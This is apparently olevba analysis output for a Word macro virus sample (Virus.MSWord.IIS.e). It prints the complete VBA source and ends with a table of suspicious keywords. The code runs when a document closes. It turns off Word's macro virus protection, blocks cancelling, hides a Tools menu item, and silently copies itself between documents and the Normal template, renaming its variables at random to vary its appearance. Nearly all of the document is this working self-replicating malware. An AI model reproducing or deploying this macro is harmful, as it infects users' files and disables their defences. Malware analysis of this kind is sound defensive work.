olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IIS.e-9295983ad13c4b9e925a36e519f9eab7a1a6c754
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.IIS.e-9295983ad13c4b9e925a36e519f9eab7a1a6c754 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
a = NormalTemplate.VBProject.vbcomponents(1).codemodule.lines(1, 1)
If a = "Private Sub Document_Close()" Then
Set inf = ActiveDocument
Set sour = NormalTemplate
ident = 1
End If
a = ActiveDocument.VBProject.vbcomponents(1).codemodule.lines(1, 1)
If a = "Private Sub Document_Close()" Then
Set inf = NormalTemplate
Set sour = ActiveDocument
ident = ident + 2
End If
If ident = 3 Then Exit Sub
'a
'ident
'inf
'sour
'lin
'b
Application.Options.VirusProtection = False
'vars
'c
'i
'newvar
'e
'ii
'm
't
'h
'ß×ùo´ºê‚
'l
Application.EnableCancelKey = wdCancelDisabled
'iii
'look
'temp
'tempb
Application.CommandBars("Tools").Controls(12).Controls(3).Visible = False
'back
'once
Options.SaveNormalPrompt = False
'f
ReDim vars(25, 25)
Do Until e = sour.VBProject.vbcomponents(1).codemodule.countoflines
e = e + 1
lin = sour.VBProject.vbcomponents(1).codemodule.lines(e, 1)
If Left(lin, 1) = "'" Then
b = b + 1
vars(b, 1) = Mid(lin, 2, Len(lin))
Randomize Timer
c = Int(Rnd * 20) + 2
For i = 1 To c
d = Int(Rnd * 74) + 130
newvar = newvar & Chr(d)
Next i
vars(b, 2) = newvar
End If
newvar = ""
Loop
For ii = 1 To 24
m = vars(ii, 2)
For t = ii + 1 To 24
If vars(t, 2) = m Then
ß×ùo´ºê‚ = Int(Rnd * 71) + 130
vars(t, 2) = Chr(ß×ùo´ºê‚)
End If
Next t
For h = 1 To 24
If vars(h, 1) = m Then
ß×ùo´ºê‚ = Int(Rnd * 71) + 130
vars(ii, 2) = Chr(ß×ùo´ºê‚)
m = vars(ii, 2)
End If
Next h
Next ii
b = 1
Do Until b = sour.VBProject.vbcomponents(1).codemodule.countoflines
m = sour.VBProject.vbcomponents(1).codemodule.lines(b, 1)
b = b + 1
l = Len(m)
iii = 0
Do Until iii >= l
iii = iii + 1
c = Mid(m, iii, 1)
If Asc(c) > 64 Then
var = var & Mid(m, iii, 1)
Else
once:
If Len(var) > 0 Then
For look = 1 To 24
If vars(look, 1) = var Then
var = vars(look, 2)
l = Len(vars(look, 1))
If h = 1 Then l = l - 1
temp = Mid(m, 1, iii - l - 1)
l = Len(m)
If h = 1 Then
tempb = ""
Else
tempb = Mid(m, iii, l)
End If
m = temp & var & tempb
l = Len(m)
iii = iii + Len(var) - Len(vars(look, 1))
Exit For
End If
Next look
End If
var = ""
If h = 1 Then
h = 0
GoTo back
End If
End If
Loop
h = 1
GoTo once
back:
f = f & m & Chr(13)
m = ""
Loop
f = f & " End Sub"
inf.VBProject.vbcomponents(1).codemodule.deletelines 1, inf.VBProject.vbcomponents(1).codemodule.countoflines
inf.VBProject.vbcomponents(1).codemodule.addfromstring (f)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

